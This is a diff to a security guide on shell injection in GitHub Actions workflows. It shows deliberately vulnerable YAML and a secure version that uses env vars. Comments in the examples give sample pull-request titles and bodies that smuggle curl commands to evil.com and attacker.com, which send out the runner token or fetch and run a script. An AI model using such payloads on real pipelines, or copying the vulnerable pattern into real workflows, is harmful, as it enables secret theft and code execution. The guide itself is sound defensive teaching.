@@ -10,18 +10,37 @@ Workflows that pipe user-controlled input directly to shell interpreters (bash, 
 - Input is piped to shell interpreters without validation or sanitization.
 - Attacker can inject malicious shell commands.
 
+The most common real-world scenario is not literally piping to `bash`, but using a context variable directly inside a `run:` block where the value is interpolated before the shell sees it:
+
 ```yaml
-name: Process Input
+name: Auto-comment on PR
 on:
   pull_request:
+    types: [opened]
 jobs:
-  process:
+  comment:
     runs-on: ubuntu-latest
+    permissions:
+      pull-requests: write
     steps:
-      - name: Process PR title
+      - name: Post welcome comment
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          echo "${{ github.event.pull_request.title }}" | bash
-          # Attacker can inject: "; curl attacker.com/steal?token=$SECRET; #"
+          # VULNERABLE: title is expanded by the expression engine before bash runs it
+          # A PR title of: hello"; curl -d @/home/runner/work/_temp/token https://evil.com #
+          # becomes a second shell command that exfiltrates the runner token file
+          gh pr comment ${{ github.event.pull_request.number }} \
+            --body "Thanks for opening: ${{ github.event.pull_request.title }}"
+```
+
+An older but still seen pattern — explicit pipe to shell:
+
+```yaml
+      - name: Install tool from PR description
+        run: |
+          # Attacker puts in PR body: "; curl https://evil.com | bash; #"
+          echo "${{ github.event.pull_request.body }}" | bash
 ```
 
 ## Mitigation Strategies
@@ -46,27 +65,36 @@ jobs:
 
 ### Secure Version
 
+Always assign context values to env vars first, then reference the env var inside the shell command — the expression engine never touches the shell command string.
+
 ```diff
- name: Process Input Safely
+ name: Auto-comment on PR
  on:
    pull_request:
+     types: [opened]
  jobs:
-   process:
+   comment:
      runs-on: ubuntu-latest
+     permissions:
+       pull-requests: write
      steps:
-       - name: Process PR title
+       - name: Post welcome comment
 +        env:
++          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
++          PR_NUMBER: ${{ github.event.pull_request.number }}
 +          PR_TITLE: ${{ github.event.pull_request.title }}
          run: |
-+          # Validate input
-+          if [[ ! "$PR_TITLE" =~ ^[a-zA-Z0-9\s-]+$ ]]; then
-+            echo "Invalid input"
-+            exit 1
++          # Validate: reject titles containing shell metacharacters
++          if [[ ! "$PR_TITLE" =~ ^[[:alnum:][:space:]_./:,!?-]+$ ]]; then
++            echo "PR title contains disallowed characters; skipping comment."
++            exit 0
 +          fi
--          echo "${{ github.event.pull_request.title }}" | bash
--          # Attacker can inject: "; curl attacker.com/steal?token=$SECRET; #"
-+          echo "Processing: $PR_TITLE"  # Safe - validated
+-          gh pr comment ${{ github.event.pull_request.number }} \
+-            --body "Thanks for opening: ${{ github.event.pull_request.title }}"
++          gh pr comment "$PR_NUMBER" --body "Thanks for opening: $PR_TITLE"
 ```
+
+> **Note:** Use `[[:space:]]` (POSIX character class) instead of `\s` in bash `[[ =~ ]]` expressions. `\s` is not guaranteed to work in all bash versions.
 
 ## Impact
 
